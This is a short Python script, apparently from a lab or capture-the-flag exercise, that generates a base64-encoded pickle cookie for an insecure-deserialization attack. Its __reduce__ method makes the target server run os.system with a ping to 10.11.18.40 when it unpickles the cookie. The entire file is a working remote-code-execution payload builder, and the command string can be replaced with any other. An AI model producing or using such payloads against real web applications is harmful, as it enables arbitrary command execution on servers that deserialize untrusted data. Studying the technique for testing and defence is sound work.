import pickle
import base64
import os 

class command:
    def __reduce__(self):
        command = ('ping -c 10 10.11.18.40')
        return os.system, (command,)

value = command()
serialised = pickle.dumps(value)
cookie = base64.b64encode(serialised)
print(cookie)
